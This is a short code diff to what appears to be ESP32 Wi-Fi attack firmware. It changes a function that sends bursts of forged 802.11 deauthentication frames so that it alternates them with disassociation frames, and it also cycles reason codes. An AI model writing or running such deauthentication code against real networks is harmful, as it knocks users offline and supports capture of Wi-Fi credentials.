@@ -1828,6 +1828,7 @@ void Politician::_sendDeauthBurst(uint8_t count, const uint8_t *sta) {
     uint8_t num_reasons = sizeof(REASONS);
 
     for (int i = 0; i < count; i++) {
+        deauth[0] = (i % 2 == 0) ? 0xC0 : 0xA0; // Alternate between Deauth (0xC0) and Disassoc (0xA0)
         deauth[22] = (i << 4) & 0xFF;
         if (_cfg.deauth_reason_cycling) {
             deauth[24] = REASONS[i % num_reasons];
@@ -1835,7 +1836,7 @@ void Politician::_sendDeauthBurst(uint8_t count, const uint8_t *sta) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
         delay(2);
     }
-    _log("[Deauth] Sent %s burst on ch%d (%s)\n", _cfg.deauth_reason_cycling ? "Fuzzing" : "Static", _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
+    _log("[Deauth] Sent %s burst (Deauth/Disassoc) on ch%d (%s)\n", _cfg.deauth_reason_cycling ? "Fuzzing" : "Static", _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
 }
 
 void Politician::_markCapturedSsidGroup(const char *ssid, uint8_t ssid_len) {
